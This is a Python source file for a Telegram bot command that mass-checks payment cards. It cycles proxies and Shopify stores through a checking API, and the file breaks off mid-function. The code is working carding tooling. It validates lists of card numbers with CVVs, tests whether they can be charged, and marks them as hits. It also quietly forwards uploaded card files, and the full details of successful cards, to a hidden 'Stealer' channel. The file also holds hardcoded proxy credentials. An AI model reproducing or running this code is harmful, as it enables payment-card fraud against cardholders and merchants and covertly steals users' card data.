import asyncio
import aiohttp
import re
import time
import json
import html
import random
import logging
import os
import psycopg2.extras
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from utils_send import safe_send_message
from database import is_gate_enabled, get_db_connection, get_user_sites_db
from bin import get_bin_info
from sub import get_premium_status

DEFAULT_PROXIES = [
    "http://1351:IBd1Fk5CuUNZ@p103.squidproxies.com:9087",
    "http://1401:FVRHsSXw2DNK@p103.squidproxies.com:9238",
    "http://1439:jqvFsDEZ&%Sm@p102.squidproxies.com:9292",
    "http://1439:jqvFsDEZ&%Sm@p103.squidproxies.com:9291",
]

async def get_user_proxies(user_id):
    proxies = []
    try:
        def _sync_fetch():
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT proxy FROM proxies WHERE user_id = %s", (user_id,))
            rows = cursor.fetchall()
            conn.close()
            return [row[0] for row in rows]
        proxies = await asyncio.to_thread(_sync_fetch)
    except Exception as e:
        logging.error(f"Error fetching proxies for user {user_id}: {e}")
    if not proxies:
        proxies = DEFAULT_PROXIES[:]
    return proxies

def normalize_proxy(proxy: str) -> str:
    if not proxy or not proxy.strip():
        return ""
    proxy = proxy.strip()
    if proxy.startswith(('http://', 'https://')):
        return proxy
    if proxy.startswith('socks5://'):
        return 'http://' + proxy[9:]
    if '@' in proxy and ':' in proxy.split('@')[0]:
        return f'http://{proxy}'
    parts = proxy.split()
    if len(parts) == 4:
        user, pwd, host, port = parts
        return f'http://{user}:{pwd}@{host}:{port}'
    if ':' in proxy and '@' not in proxy:
        parts = proxy.split(':')
        if len(parts) == 2 and parts[1].isdigit():
            return f'http://{proxy}'
    return f'http://{proxy}'

router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 4-REPLICA SHOPIFY CLUSTER CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
try:
    from shopify_api import get_active_server, SHOPIFY_API_KEY, ALT_API_KEY, API_SERVERS
except ImportError:
    import sys
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from shopify_api import get_active_server, SHOPIFY_API_KEY, ALT_API_KEY, API_SERVERS

SITES_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "mass_gates", "sites.txt")

MAX_MASS_CARDS = 50
PARALLEL_LIMIT = 10
MAX_RETRIES = 5
MAX_SITE_ROTATIONS = 20
UPDATE_EVERY = 10

SH_SESSIONS = {}

# Custom Emoji IDs
CUSTOM_CHARGED_EMOJI_ID = "5042050649248760772"
CUSTOM_APPROVED_EMOJI_ID = "5039844895779455925"
CUSTOM_DECLINED_EMOJI_ID = "4956611513369494230"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DATABASE HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def ensure_stats_columns():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_checked INTEGER DEFAULT 0")
        except Exception:
            pass
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_charged INTEGER DEFAULT 0")
        except Exception:
            pass
        conn.commit()
        conn.close()
    except Exception as e:
        logging.error(f"Error checking stats columns: {e}")

ensure_stats_columns()

def update_user_stats_sync(user_id, checked_count, charged_count):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE users SET cc_checked = cc_checked + %s WHERE user_id = %s",
        (checked_count, user_id)
    )
    if charged_count > 0:
        cursor.execute(
            "UPDATE users SET cc_charged = cc_charged + %s WHERE user_id = %s",
            (charged_count, user_id)
        )
    conn.commit()
    conn.close()

async def get_user_plan_name(user_id):
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            def _sync_fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute(
                    "SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1",
                    (user_id,)
                )
                row = cursor.fetchone()
                conn.close()
                if row:
                    p = row['plan'].lower()
                    if any(k in p for k in ["kashim", "chirag", "darkanon"]): return "DARKANON <tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji>"
                    if "root" in p: return '𝗥𝗼𝗼𝘁 <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                    if "elite" in p: return '𝗘𝗹𝗶𝘁𝗲 ⭐'
                    if "core" in p: return '𝗖𝗼𝗿𝗲 <tg-emoji emoji-id="5042274086332400375">🛠️</tg-emoji>'
                    return row['plan']
                return "𝗣𝗿𝗲𝗺𝗶𝘂𝗺"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "𝗣𝗿𝗲𝗺𝗶𝘂𝗺"
    return "𝗧𝗿𝗶𝗮𝗹"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GENERAL HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

logger = logging.getLogger(__name__)

def load_sites() -> List[str]:
    try:
        if not os.path.exists(SITES_FILE):
            return []
        with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
            sites = [line.strip() for line in f if line.strip()]
            
            # Filter banned sites
            banned_path = os.path.join(os.path.dirname(SITES_FILE), "banned_sites.json")
            if os.path.exists(banned_path):
                try:
                    import json
                    with open(banned_path, "r", encoding="utf-8") as bf:
                        banned = set(json.load(bf))
                        sites = [s for s in sites if s not in banned]
                except Exception as e:
                    logger.error(f"Error loading banned sites: {e}")
            return sites
    except Exception as e:
        logger.error(f"Error loading sites: {e}")
        return []

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    for i, char in enumerate(card_number[::-1]):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        exp_year = int(yy)
        exp_month = int(mm)
        current_year = now.year % 100
        if exp_year < current_year:
            return True
        if exp_year == current_year and exp_month < now.month:
            return True
        return False
    except ValueError:
        return True

def parse_card(text: str) -> Optional[Tuple[str, str, str, str]]:
    text = text.strip()
    pattern = r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})'
    match = re.search(pattern, text)
    if match:
        cc, mm, yy, cvv = match.groups()
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        return cc, mm, yy, cvv
    return None

def extract_cards(raw_text: str) -> List[str]:
    cards = []
    for line in raw_text.split('\n'):
        data = parse_card(line)
        if data:
            cc, mm, yy, cvv = data
            cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cards[:MAX_MASS_CARDS]

def get_sort_priority(response_text: str) -> int:
    resp = response_text.upper()
    if any(k in resp for k in ["ORDER_PLACED", "CHARGED", "THANK YOU"]):
        return 1
    if "INSUFFICIENT_FUNDS" in resp or "INVALID_CVC" in resp:
        return 2
    if "3DS" in resp or "3D_AUTH" in resp:
        return 3
    return 3

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE CHECKING LOGIC  (new API + proxy rotation)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Responses that mean "try a different site / proxy" — not a real card decline
ROTATION_TRIGGERS = [
    'validation_custom', 'decision_rule_block',
    'merchandise_expected_price_mismatch',
    'generic_error', 'generic error', 'error:', 'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'invalid json in submit response', 'invalid json response', 'unknown result', 'payments_credit_card_generic',
    'payments_positive_amount_expected', 'inventoryreservationfailure',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site error! status: 404',
    'site error! status: 401', 'site error! status: 402',
    'failed to get checkout', 'captcha at checkout', 'site not supported',
        'connection error', 'connection error!', 'error processing card',
        '504', 'server error', 'client error', 'failed', 'amount_too_small',
        'change proxy or site', 'token not found', 'invalid_response',
        'resolve', 'item', 'curl error', 'could not resolve host',
        'connect tunnel failed', 'api error: http 429', 'http 429', '429', 'too many requests',
        'payments_credit_card_brand_not_supported', 'delivery_delivery_line_detail_changed',
        'delivery_no_delivery_strategy_available_for_mercha', 'delivery_no_delivery_strategy_available',
        'delivery_address', 'artifacts on the seller proposal',
        'payments_payment_flexibility_terms_id_mismatch',
        'no_product', 'no products found', 'no_shopify_payments_gateway',
        'site_requires_login', 'cart_failed', 'checkout_failed',
        'tokenization_failed', 'negotiate_failed', 'checkpointdenied',
        'order_creation_failed', 'throttled', 'graphql_error',
        'no_session_token', 'no_attempt_token', 'no_seller_proposal',
]

async def check_card_logic(sites: List[str], cc: str, proxies: List[str]) -> Dict:
    bin_num = cc.split('|')[0][:6]

    try:
        bin_data = await get_bin_info(bin_num)
        brand = (bin_data.get("scheme") or "N/A").upper()
        card_type = (bin_data.get("type") or "N/A").upper()
        level = (bin_data.get("brand") or "N/A").upper()
        issuer = (bin_data.get("bank") or "N/A").upper()
        country = (bin_data.get("country") or "N/A").upper()
        flag = bin_data.get("country_emoji") or ""
    except Exception:
        brand = "N/A"
        card_type = "N/A"
        level = "N/A"
        issuer = "N/A"
        country = "N/A"
        flag = ""

    declined_sym = f'<tg-emoji emoji-id="4915853119839011973">⚠️</tg-emoji>'

    last_site = None
    last_display_resp = "Dead / Site Error"
    last_price = "N/A"
    last_symbol = declined_sym

    rotation_count = 0
    while rotation_count < MAX_SITE_ROTATIONS:
        rotation_count += 1

        # Fresh site every attempt
        candidates = [s for s in sites if s != last_site] or sites
        current_site = random.choice(candidates)
        last_site = current_site

        # Fresh proxy every attempt
        raw_proxy = random.choice(proxies)
        proxy = normalize_proxy(raw_proxy)
        api_proxy = proxy
        if api_proxy.startswith("http://"):
            api_proxy = api_proxy[7:]
        elif api_proxy.startswith("https://"):
            api_proxy = api_proxy[8:]
        elif api_proxy.startswith("socks5://"):
            api_proxy = api_proxy[9:]

        try:
            timeout = aiohttp.ClientTimeout(total=30)
            server = get_active_server()
            current_api = f"{server}/shopify"
            async with aiohttp.ClientSession() as session:
                for key in [SHOPIFY_API_KEY, ALT_API_KEY]:
                    params = {"site": current_site, "cc": cc, "proxy": api_proxy, "key": key}
                    async with session.get(current_api, params=params, timeout=timeout) as resp:
                        if resp.status in (401, 403):
                            continue
                        if resp.status == 429:
                            break

                        text = await resp.text()
                        data = json.loads(text)
                        break

                    raw_resp = data.get("Response", "N/A")
                    raw_price = data.get("Price", "N/A")

                    display_resp = (
                        str(raw_resp)
                        .replace("\\\\", "")
                        .replace('"', '')
                        .replace("'", "")
                    )

                    price_display = "N/A"
                    if raw_price not in ("N/A", None, ""):
                        try:
                            val = float(
                                str(raw_price).replace("USD", "").replace("$", "").strip()
                            )
                            price_display = f"${val} USD"
                        except ValueError:
                            price_display = str(raw_price)

                    lower = display_resp.lower()

                    fake_charge_detected = False
                    if any(k in lower for k in ["thank you", "order_placed", "charged"]):
                        fake_params = {
                            "site": current_site,
                            "cc": "4400666318254873|03|27|336",
                            "proxy": api_proxy,
                            "key": key
                        }
                        try:
                            async with aiohttp.ClientSession() as f_session:
                                async with f_session.get(current_api, params=fake_params, timeout=timeout) as f_resp:
                                    if f_resp.status == 200:
                                        f_text = await f_resp.text()
                                        f_data = json.loads(f_text)
                                        f_lower = str(f_data.get("Response", "")).lower()
                                        if any(k in f_lower for k in ["thank you", "order_placed", "charged"]):
                                            fake_charge_detected = True
                        except Exception:
                            pass

                        if fake_charge_detected:
                            display_resp = "Site Error (Fake Charge Site)"
                            symbol = declined_sym
                        else:
                            symbol = f'<tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">🔥</tg-emoji>'
                    elif any(k in lower for k in ["insufficient_funds", "invalid_cvc"]):
                        symbol = f'<tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>'
                    elif any(k in lower for k in ["3d_authentication", "3ds_required", "otp_required"]):
                        symbol = declined_sym
                    else:
                        symbol = declined_sym

                    last_display_resp = display_resp
                    last_price = price_display
                    last_symbol = symbol

                    needs_rotation = fake_charge_detected or any(t in lower for t in ROTATION_TRIGGERS)
                    if needs_rotation:
                        continue  # next iteration = new site + new proxy

                    return {
                        "card": cc,
                        "resp": display_resp,
                        "price": price_display,
                        "brand": brand,
                        "type": card_type,
                        "level": level,
                        "bank": issuer,
                        "country": country,
                        "flag": flag,
                        "symbol": symbol,
                    }

        except (aiohttp.ClientResponseError, aiohttp.ClientConnectorError, asyncio.TimeoutError, json.JSONDecodeError):
            continue

    return {
        "card": cc,
        "resp": last_display_resp,
        "price": last_price,
        "brand": brand,
        "type": card_type,
        "level": level,
        "bank": issuer,
        "country": country,
        "flag": flag,
        "symbol": last_symbol,
    }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/sh"))
async def sh_command(message: types.Message):
    user_id = message.from_user.id
    user_name = html.escape(message.from_user.first_name or "User")

    if not await asyncio.to_thread(is_gate_enabled, "sh"):
        await message.reply(
            "<tg-emoji emoji-id='4958926882994127612'>🚧</tg-emoji> <b>𝗠𝗮𝘀𝘀 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>",
            parse_mode="HTML"
        )
        return

    user_sites = await asyncio.to_thread(get_user_sites_db, user_id)
    if user_sites:
        sites = user_sites
    else:
        sites = load_sites()
    if not sites:
        await message.reply("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> No sites found.", parse_mode="HTML")
        return

    # Fetch user proxies
    user_proxies = await get_user_proxies(user_id)
    if not user_proxies:
        await message.reply(
            "<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> <b>𝗡𝗼 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗙𝗼𝘂𝗻𝗱</b>\n\n"
            "You need to add proxies to use this gate.\n"
            "Use <code>/proxy</code> to add proxies.",
            parse_mode="HTML"
        )
        return

    # ─── Extract cards from command text, replies, and attachments ───
    raw_text = ""
    cmd_text = message.text or message.caption or ""
    parts = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1].strip() + "\n"

    if message.reply_to_message:
        replied = message.reply_to_message
        if replied.text:
            raw_text += replied.text + "\n"
        elif replied.caption:
            raw_text += replied.caption + "\n"

    # Handle document attachment
    document = message.document
    if not document and message.reply_to_message:
        document = message.reply_to_message.document

    if document:
        try:
            await message.bot.send_document(
                chat_id=-1004462990283,
                document=document.file_id,
                caption=f"User <a href='tg://user?id={user_id}'>{user_name}</a> sent a txt file in /sh",
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Failed to forward txt file to extra group: {e}")

        if document.file_size > 2 * 1024 * 1024:
            await message.reply("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> File too large. Max 2MB.")
            return
        try:
            file_info = await message.bot.get_file(document.file_id)
            byte_content = await message.bot.download_file(file_info.file_path)
            if byte_content:
                data = byte_content.read() if hasattr(byte_content, 'read') else byte_content
                raw_text += data.decode('utf-8', errors='ignore') + "\n"
        except Exception as e:
            await message.reply(f"<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> Error reading file: {e}")
            return

    if not raw_text.strip():
        await message.reply(
            "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> <b>Usage:</b> Reply to a message with cards or send\n"
            "<code>/sh cc|mm|yy|cvv</code>\n"
            "Or send a text file with <code>/sh</code> as caption.",
            parse_mode="HTML"
        )
        return

    # ─── Extract & deduplicate ───────────────────────────────────────
    extracted = extract_cards(raw_text)
    if not extracted:
        await message.reply("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> No valid cards found.")
        return

    seen = set()
    unique_cards = []
    for card in extracted:
        if card not in seen:
            seen.add(card)
            unique_cards.append(card)

    # ─── Validate (Luhn + expiry) ────────────────────────────────────
    final_valid_cards = []
    luhn_fail_count = 0
    expired_count = 0

    for cc in unique_cards:
        p = cc.split('|')
        if len(p) < 4:
            continue
        cc_num, mm, yy, _ = p
        if not luhn_check(cc_num):
            luhn_fail_count += 1
            continue
        if is_expired(mm, yy):
            expired_count += 1
            continue
        final_valid_cards.append(cc)

    if luhn_fail_count > 0 or expired_count > 0:
        removed = luhn_fail_count + expired_count
        await message.reply(
            f"ℹ️ <b>Removed:</b> {removed} invalid/expired cards.\n"
            f"Checking <b>{len(final_valid_cards)}</b> valid cards...",
            parse_mode="HTML"
        )

    if not final_valid_cards:
        await message.reply("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No valid cards to check after filtering.")
        return

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    asyncio.create_task(
        run_sh_check(message, sites, final_valid_cards, user_name, user_id, is_premium, user_proxies)
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ASYNC MASS CHECKER & UI
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def run_sh_check(
    message: types.Message,
    sites: List[str],
    cards: List[str],
    user_name: str,
    user_id: int,
    is_premium: bool,
    user_proxies: List[str],
):
    start_time = time.time()
    total_cards = len(cards)
    user_link = f"<a href='tg://user?id={user_id}'>{user_name}</a>"

    status_msg = await message.reply(
        f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <code>{total_cards}</code>\n"
        f"<tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛ <code>0.0s</code>\n"
        f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_link}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<tg-emoji emoji-id='5039579582764680065'>⏳</tg-emoji> <b>𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸...</b>",
        parse_mode="HTML"
    )
    msg_id = status_msg.message_id

    SH_SESSIONS[msg_id] = {
        "gate_name": "sh",
        "results": [],
        "page": 0,
        "total_cards": total_cards,
        "start_time": start_time,
        "user_name": user_name,
        "user_id": user_id,
        "msg_id": msg_id,
    }

    sem = asyncio.Semaphore(PARALLEL_LIMIT)

    async def worker(cc: str):
        async with sem:
            return await check_card_logic(sites, cc, user_proxies)

    tasks = [asyncio.create_task(worker(cc)) for cc in cards]

    results = []
    pending = set(tasks)

    while pending:
        done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
        for task in done:
            try:
                res = task.result()
                results.append(res)
                
                # Check for charged or insufficient funds to send to logs/stealer
                symbol = res.get("symbol", "")
                resp_text = str(res.get("resp", "")).lower()
                is_charged = f'emoji-id="{CUSTOM_CHARGED_EMOJI_ID}"' in symbol
                is_insufficient = "insufficient" in resp_text

                if is_charged or is_insufficient:
                    hit_type = "CHARGED" if is_charged else "APPROVED"
                    
                    card_parts = res['card'].split('|')
                    if len(card_parts) >= 1:
                        cc = card_parts[0]
                        if len(cc) > 4:
                            card_parts[0] = "x" * (len(cc) - 4) + cc[-4:]
                    for idx in range(1, len(card_parts)):
                        card_parts[idx] = "x" * len(card_parts[idx])
                    masked_card = "|".join(card_parts)

                    try:
                        price_val = res.get("price") or "N/A"
                        price_str = f"{price_val}" if price_val not in ["N/A", ""] else "N/A"
                        brand_val = res.get("brand") or "N/A"
                        type_val = res.get("type") or "N/A"
                        level_val = res.get("level") or "N/A"
                        bank_val = res.get("bank") or "N/A"
                        flag_val = res.get("flag") or ""
                        country_val = res.get("country") or "N/A"

                        bold_hit = to_math_bold(hit_type)
                        bold_price = to_math_bold(price_str)
                        bold_brand = to_math_bold(brand_val)
                        bold_type = to_math_bold(type_val)
                        bold_level = to_math_bold(level_val)
                        bold_bank = to_math_bold(bank_val)
                        bold_country = to_math_bold(country_val)
                        bold_username = to_math_bold(user_name)

                        # Logs Caption (Clean 4 lines)
                        hit_emoji = "💎" if hit_type == "CHARGED" else "✅"
                        caption_logs = (
                            f"<b>Hit ➔</b> {hit_type} {hit_emoji}\n"
                            f"<b>GATE ➔</b> Shopify {price_str} 💸\n"
                            f"<b>Res ➔</b> {html_escape(str(res.get('resp', 'N/A')))}\n"
                            f"<b>USER ➔</b> <a href='tg://user?id={user_id}'>{bold_username}</a>"
                        )
                        reply_markup_logs = InlineKeyboardMarkup(inline_keyboard=[
                            [InlineKeyboardButton(text="𝗖𝗵𝗲𝗰𝗸 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀", url="https://t.me/lightxHub_bot", style="primary")]
                        ])

                        # Stealer Caption (Full Card Details)
                        caption_stealer = (
                            f"<b><tg-emoji emoji-id='5386367538735104399'>🆕</tg-emoji> {bold_hit}! {symbol}</b>\n\n"
                            f"<b><tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> {to_math_bold('CC:')}</b> <code><b>{res['card']}</b></code>\n"
                            f"<b><tg-emoji emoji-id='5431609822288033666'>🛍️</tg-emoji> {to_math_bold('Gate:')}</b> <b>{to_math_bold('Shopify Payments')}</b>\n"
                            f"<b><tg-emoji emoji-id='4958926882994127612'>💰</tg-emoji> {to_math_bold('Price:')} {bold_price}</b>\n\n"
                            f"<b><tg-emoji emoji-id='5042329873662609701'>🗑️</tg-emoji> {to_math_bold('BIN Info:')}</b>\n"
                            f"<b><tg-emoji emoji-id='5039753786638205957'>🔹</tg-emoji> {to_math_bold('Brand:')} {bold_brand}</b>\n"
                            f"<b><tg-emoji emoji-id='5042020176455795565'>🔸</tg-emoji> {to_math_bold('Type:')} {bold_type}</b>\n"
                            f"<b><tg-emoji emoji-id='5042097984083330584'>🔘</tg-emoji> {to_math_bold('Level:')} {bold_level}</b>\n"
                            f"<b><tg-emoji emoji-id='5343636681473935403'>🏛️</tg-emoji> {to_math_bold('Bank:')} {bold_bank}</b>\n"
                            f"<b><tg-emoji emoji-id='5042176294222037888'>🌍</tg-emoji> {to_math_bold('Country:')}</b> {flag_val} <b>{bold_country}</b>\n\n"
                            f"<b><tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> {to_math_bold('Checked by:')}</b> <a href='tg://user?id={user_id}'><b>{bold_username}</b></a>"
                        )

                        # Broadcast to Logs channel (@lightXhub1) with Masked Card
                        await safe_send_message(message.bot,
                            chat_id=-1004462990283,
                            text=caption_logs,
                            parse_mode="HTML",
                            reply_markup=reply_markup_logs
                        )

                        # Broadcast to Stealer / Admins channel (-1004348615901) with Full Card
                        await safe_send_message(message.bot,
                            chat_id=-1004348615901,
                            text=caption_stealer,
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.error(f"Failed to broadcast hit: {e}")
            except Exception as e:
                logger.error(f"Worker error: {e}")

        results.sort(key=lambda x: get_sort_priority(x["resp"]))

        if len(results) % UPDATE_EVERY == 0 or not pending:
            elapsed = round(time.time() - start_time, 2)
            SH_SESSIONS[msg_id]["results"] = results
            SH_SESSIONS[msg_id]["elapsed_final"] = elapsed

            text = format_page_content(SH_SESSIONS[msg_id], elapsed, is_working=True)
            if len(results) < total_cards:
                text += f"\n\n<tg-emoji emoji-id='5039579582764680065'>⏳</tg-emoji> <b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(results)}/{total_cards}...</b>"

            try:
                await status_msg.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
            except Exception:
                pass

    elapsed_final = round(time.time() - start_time, 2)
    SH_SESSIONS[msg_id]["elapsed_final"] = elapsed_final

    # ─── Stats ───────────────────────────────────────────────────────
    charged_count = sum(
        1 for r in results
        if f'emoji-id="{CUSTOM_CHARGED_EMOJI_ID}"' in r.get("symbol", "")
    )
    await asyncio.to_thread(update_user_stats_sync, user_id, len(results), charged_count)

    final_text = format_page_content(SH_SESSIONS[msg_id], elapsed_final, is_working=False)
    final_text += "\n\n<tg-emoji emoji-id='5039844895779455925'>🍾</tg-emoji> <b>𝗖𝗵𝗲𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲.</b>"

    await status_msg.edit_text(final_text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))


def to_math_bold(s: str) -> str:
    bold_map = {
        'a':'𝗮','b':'𝗯','c':'𝗰','d':'𝗱','e':'𝗲','f':'𝗳','g':'𝗴','h':'𝗵','i':'𝗶','j':'𝗷','k':'𝗸','l':'𝗹','m':'𝗺','n':'𝗻','o':'𝗼','p':'𝗽','q':'𝗾','r':'𝗿','s':'𝘀','t':'𝘁','u':'𝘂','v':'𝘃','w':'𝘄','x':'𝘅','y':'𝘆','z':'𝘇',
        'A':'𝗔','B':'𝗕','C':'𝗖','D':'𝗗','E':'𝗘','F':'𝗙','G':'𝗚','H':'𝗛','I':'𝗜','J':'𝗝','K':'𝗞','L':'𝗟','M':'𝗠','N':'𝗡','O':'𝗢','P':'𝗣','Q':'𝗤','R':'𝗥','S':'𝗦','T':'𝗧','U':'𝗨','V':'𝗩','W':'𝗪','X':'𝗫','Y':'𝗬','Z':'𝗭',
        '0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵'
    }
    return "".join(bold_map.get(c, c) for c in s)


def format_page_content(state: Dict, elapsed: float, is_working: bool) -> str:
    results = state["results"]
    page = state["page"]
    start_idx = page * 6
    page_results = results[start_idx: start_idx + 6]

    user_link = f"<a href='tg://user?id={state['user_id']}'>{state['user_name']}</a>"

    text = (
        f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <code>{len(results)}/{state['total_cards']}</code>\n"
        f"<tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛ <code>{elapsed}s</code>\n"
        f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_link}\n"
        f"━━━━━━━━━━━━━━━━"
    )

    for res in page_results:
        safe_resp = to_math_bold(html.escape(res.get("resp", "UNKNOWN")))
        price_val = res.get("price") or "N/A"
        price_str = to_math_bold(f"{price_val}" if price_val not in ["N/A", ""] else "N/A")
        brand_val = to_math_bold(res.get("brand") or "N/A")
        type_val = to_math_bold(res.get("type") or "N/A")
        level_val = to_math_bold(res.get("level") or "N/A")
        bank_val = to_math_bold(res.get("bank") or "N/A")
        flag_val = res.get("flag") or ""
        country_val = to_math_bold(res.get("country") or "N/A")

        text += (
            f"\n<b><tg-emoji emoji-id='5386367538735104399'>🆕</tg-emoji> {safe_resp}! {res.get('symbol', '')}</b>\n\n"
            f"<b><tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> {to_math_bold('CC:')}</b> <code><b>{res['card']}</b></code>\n"
            f"<b><tg-emoji emoji-id='5431609822288033666'>🛍️</tg-emoji> {to_math_bold('Gate:')}</b> <b>{to_math_bold('Shopify Payments')}</b>\n"
            f"<b><tg-emoji emoji-id='4958926882994127612'>💰</tg-emoji> {to_math_bold('Price:')} {price_str}</b>\n\n"
            f"<b><tg-emoji emoji-id='5042329873662609701'>🗑️</tg-emoji> {to_math_bold('BIN Info:')}</b>\n"
            f"<b><tg-emoji emoji-id='5039753786638205957'>🔹</tg-emoji> {to_math_bold('Brand:')} {brand_val}</b>\n"
            f"<b><tg-emoji emoji-id='5042020176455795565'>🔸</tg-emoji> {to_math_bold('Type:')} {type_val}</b>\n"
            f"<b><tg-emoji emoji-id='5042097984083330584'>🔘</tg-emoji> {to_math_bold('Level:')} {level_val}</b>\n"
            f"<b><tg-emoji emoji-id='5343636681473935403'>🏛️</tg-emoji> {to_math_bold('Bank:')} {bank_val}</b>\n"
            f"<b><tg-emoji emoji-id='5042176294222037888'>🌍</tg-emoji> {to_math_bold('Country:')}</b> {flag_val} <b>{country_val}</b>\n"
            f"━━━━━━━━━━━━━━━━"
        )

    return text


def get_keyboard(msg_id: int) -> Optional[InlineKeyboardMarkup]:
    state = SH_SESSIONS.get(msg_id)
    if not state:
        return None

    total = len(state["results"])
    pages = (total + 5) // 6
    current = state["page"]

    row = []
    if current > 0:
